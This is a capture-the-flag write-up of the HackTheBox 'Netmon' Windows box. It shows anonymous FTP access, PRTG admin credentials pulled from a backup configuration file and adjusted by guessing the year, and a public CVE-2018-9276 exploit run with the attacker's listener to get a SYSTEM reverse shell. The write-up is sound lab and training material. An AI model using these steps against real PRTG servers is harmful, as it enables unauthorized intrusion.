Netmon

HackTheBox Writeup

Box Name: Netmon

Difficulty: Easy

OS: Windows

Date Completed: 26-06-2026

IP Address: 10.129.230.176

Summary

Enumerating the box showed several ports being open, indicating this is a Windows box. Through anonymous login on FTP I could access the public directory and read user flag. On the other enumerated port 80, I visited the website and noticed a network monitor tool was running. I also noted the version 18.1.37.13946. After research I found that this version is vulnerable but only when authenticated was the exploit possible. This made me enumerate the box further through FTP to find a configuration file with the username and password. After a small change to the password I could login and attempt the exploit. The exploit gave me a reverse shell as SYSTEM.

FTP Enumeration

In the nmap output it showed that FTP was accessible with anonymous login. This means we can login using just the username anonymous. After login I could browse through the file system and enumerate.

└──╼ [★]$ ftp 10.129.230.176
Name (10.129.230.176:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
230 User logged in.
Remote system type is Windows_NT.
ftp>

FTP User flag

Quick enumeration showed two users, Public and Administrator. Administrator was off limits and not accessible. However when navigating to the Public user, I could browse to the Desktop and capture user flag.

ftp> cd Users/Public/Desktop
ftp> dir
02-03-19  12:18AM                 1195 PRTG Enterprise Console.lnk
02-03-19  12:18AM                 1160 PRTG Network Monitor.lnk
06-26-26  04:22AM                   34 user.txt

Also note the PRTG Network Monitor link.

Privilege Escalation / Initial access

Web Enumeration

With the user flag captured in the FTP share, I still did not have a foothold or credentials to work with. I left FTP for a while and focussed on the HTTP port and enumerated there.

When visiting the page, I get greeted by a login page of the Paessler Network Monitor tool.

📷 Save screenshot here as netmon_01.png
PRTG Network Monitor login page showing version 18.1.37.13946

Here I notice I have to login and I have no credentials. I also notice the version in the footer of the webpage. While I shift my focus back to FTP to enumerate and find sensitive files and hopefully credentials, I also search the version of this tool to see if there are any known vulnerabilities.

Credential find

Knowing that this tool is running on this machine, I research configuration files. After some research I found that the tool saves its configuration files under C:\ProgramData\Paessler. When looking through this folder I found the following interesting files:

  • PRTG Configuration.dat
  • PRTG Configuration.old.bak
ftp> cd ProgramData/Paessler/PRTG Network Monitor
ftp> dir
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak

After searching through the .dat file, I did not find any useful information. However when searching through the old.bak file I found the following credentials:

User: prtgadmin
Pass: PrTg@dmin2018

Exploitation and root flag

With credentials, I can now login and focus on finding an attack vector. In the meantime I found a CVE that had many PoCs available and had the possibility to execute a reverse shell.

CVE: CVE-2018-9276

The CVE mentions that the exploit only works when you are authenticated. Lucky for me I just found credentials. I downloaded one of the PoCs and executed the payload.

└──╼ [★]$ python3 exploit.py -i 10.129.230.176 -p 80 --lhost 10.10.14.53 --lport 4444 \
    --user prtgadmin --password PrTg@dmin2018
[+] [PRTG/18.1.37.13946] is Vulnerable!
ValueError: Session not obtained. Check your username/password and try again!

The payload did not execute and in the error I notice that the username or password is not correct. I tried to login with these credentials in the web service but no success either. For basic wordlist technique I added +1 and -1 for the year. So 2018 becomes 2019.

└──╼ [★]$ python3 exploit.py -i 10.129.230.176 -p 80 --lhost 10.10.14.53 --lport 4444 \
    --user prtgadmin --password PrTg@dmin2019
[+] [PRTG/18.1.37.13946] is Vulnerable!
[+] Session obtained for [prtgadmin:PrTg@dmin2019]
[*] Hosting payload at [\\10.10.14.53\FZHLRMJF]
[+] Listening on [10.10.14.53:4444 for the reverse shell!]
Connection received on 10.129.230.176 50493
Microsoft Windows [Version 10.0.14393]
C:\Windows\system32>

The exploit worked and gave me a direct reverse shell. When checking the user I notice I have received the reverse shell as Administrator. I went to the Administrator Desktop and captured the root flag.

C:\Users\Administrator\Desktop>type root.txt

With this the box has been successfully compromised.

Key Takeaways

  • Anonymous FTP access can lead to leaked credentials or even open user accounts.
  • Thorough research of tooling can lead to known configuration file paths and credential use standards.
  • CVE research can help in finding an effective reverse shell.
